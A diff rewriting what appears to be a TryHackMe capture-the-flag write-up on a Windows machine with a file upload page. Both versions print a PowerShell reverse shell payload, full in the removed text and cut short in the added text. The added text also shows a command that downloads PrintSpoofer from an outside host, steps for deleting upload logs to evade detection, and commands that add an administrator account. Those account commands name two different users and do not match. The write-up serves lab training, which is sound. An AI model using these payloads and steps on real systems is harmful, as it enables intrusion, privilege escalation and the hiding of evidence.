@@ -1,104 +1,47 @@
-Begin by initiating the virtual machine; click on the "Start Machine" button located in the top right corner of the task. Then, access the machine by navigating to 10.10.34.210:8080. This challenge can be tackled either through a VPN connection or by using the AttackBox, which is equipped with all necessary tools.
+Webpage Exploration: Skipped the nmap scan and directly explored port 8080, encountering a webpage with file upload functionality.
 
-Bypassing the nmap scan, I directly explored port 8080 and was presented with a webpage that featured file upload functionality.
+Reverse Shell Setup: Established a Netcat listener on port 9001 and crafted a PowerShell reverse shell payload for upload.
 
-I set up a Netcat listener on port 9001 and proceeded to craft a PowerShell (ps1) reverse shell payload, which I then uploaded.
+PowerShell Reverse Shell Code:
 
-Here’s how I created the ps1 reverse shell:
+powershell code: 
+$LHOST = "10.10.10.10"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); ...
+This script successfully granted low-level shell access upon upload and execution.
 
-powershell
+Discovering Sensitive Information
+Finding Encoded Message: Located a base64 encoded message in C:\Users\evader\Desktop.
+Decoding the Message: Revealed a URL: http://10.10.34.210:8000/asdasdadasdjakjdnsdfsdfs.php.
+Evading Blue Team Detection
+Deleting File Upload Logs: To access the newly found page, I had to delete file upload logs at C:\xampp\htdocs\uploads.
+Retrieving the First Flag: Successfully accessed the page and retrieved the flag: THM{****************}.
+Manual Windows Privilege Escalation
+Exploring System Information: Ran systeminfo to gather system details. Notably, the system had no hotfixes, indicating potential vulnerabilities.
+Privilege Escalation via PrintSpoofer
+Context Understanding: Noted that the SeImpersonatePrivilege was enabled(Use p0wny-shell to gain a shell on xampp service )
+
+Leveraging PrintSpoofer: Used the PrintSpoofer technique, exploiting the Windows print spooler service.
+
+PrintSpoofer Execution:
+
+Download: Used Invoke-WebRequest to download the PrintSpoofer binary.
+cmd
 Copy code
-$LHOST = "10.6.9.14"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); 
-$NetworkStream = $TCPClient.GetStream(); 
-$StreamReader = New-Object IO.StreamReader($NetworkStream); 
-$StreamWriter = New-Object IO.StreamWriter($NetworkStream); 
-$StreamWriter.AutoFlush = $true; 
-$Buffer = New-Object System.Byte[] 1024; 
-while ($TCPClient.Connected) { 
-    while ($NetworkStream.DataAvailable) { 
-        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); 
-        $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) 
-    }; 
-    if ($TCPClient.Connected -and $Code.Length -gt 1) { 
-        $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; 
-        $StreamWriter.Write("$Output`n"); 
-        $Code = $null 
-    } 
-}; 
-$TCPClient.Close(); 
-$NetworkStream.Close(); 
-$StreamReader.Close(); 
-$StreamWriter.Close()
-Successfully, this granted me a low-level shell access.
+iwr -uri "http://10.11.50.160/PrintSpoofer.exe" -o PrintSpoofer.exe
+Run Command: Executed PrintSpoofer to gain a SYSTEM shell.
+cmd
+Copy code
+.\PrintSpoofer.exe -i -c cmd
+Privilege Escalation: Performed actions that required elevated privileges, including creating a new administrative user.
+Final Steps
+Creating Administrative User:
+cmd
+Copy code
+net user newRoot password /add
+net localgroup administrators newuser /add
 
-In this directory we find an base64 encoded message: C:\Users\evader\Desktop
+You will now be able to rdp in, or use the newRoot user to read the flag in the administrator folder. 
 
-After decoding this message we get a url: http://10.10.34.210:8000/asdasdadasdjakjdnsdfsdfs.php.
-
-It seems that the Blue team was alerted. A hint suggested that I should delete the file upload logs to access the page. The log files were located at C:\xampp\htdocs\uploads.
-
-After removing all the logs, I successfully retrieved the first flag:
+You now have the capability to remotely access the system via RDP, or alternatively, you can utilize the newly created newRoot user account to access and read the flag located in the Administrator's folder.
 
 THM{****************}
-
-Manual Windows Priv: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
-
-We can't run winpeas so we need to either create a ps1 script to upload or use one in the wild: https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1
-
-systeminfo:
-
-System Information Summary:
-System Information
-
-Host Name: HOSTEVASION
-OS Name: Microsoft Windows Server 2019 Datacenter
-OS Version: 10.0.17763 N/A Build 17763
-OS Manufacturer: Microsoft Corporation
-OS Configuration: Standalone Server
-OS Build Type: Multiprocessor Free
-Registered Owner: EC2
-Registered Organization: Amazon.com
-Product ID: 00430-00000-00000-AA191
-Original Install Date: 3/17/2021, 2:59:06 PM
-System Boot Time: 12/1/2023, 11:21:16 PM
-System Manufacturer: Xen
-System Model: HVM domU
-System Type: x64-based PC
-Processor(s): 1 Processor(s) Installed.
-01: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
-BIOS Version: Xen 4.11.amazon, 8/24/2006
-Windows Directory: C:\Windows
-System Directory: C:\Windows\system32
-Boot Device: \Device\HarddiskVolume1
-System Locale: en-us; English (United States)
-Input Locale: en-us; English (United States)
-Time Zone: (UTC) Coordinated Universal Time
-Total Physical Memory: 4,096 MB
-Available Physical Memory: 2,914 MB
-Virtual Memory: Max Size: 4,800 MB
-Virtual Memory: Available: 3,609 MB
-Virtual Memory: In Use: 1,191 MB
-Page File Location(s): C:\pagefile.sys
-Domain: WORKGROUP
-Logon Server: N/A
-Hotfix(s): N/A
-Network Card(s): 1 NIC(s) Installed.
-01: AWS PV Network Device
-Connection Name: Ethernet
-DHCP Enabled: Yes
-DHCP Server: 10.10.0.1
-IP address(es):
-
-We can notice there is no hotfixes on this system. 
-
-https://www.exploit-db.com/exploits/47128
-
-metasploit: 0  exploit/windows/local/appxsvc_hard_link_privesc 
-
-https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/local/appxsvc_hard_link_privesc
-
-https://www.puckiestyle.nl/meterpreter-reverse-shell-with-powershell/
-
-The system was filtering only on uploading so making a invoke request into the log foler didn't check the file and was able to get a meterpreter shell. 
-
 
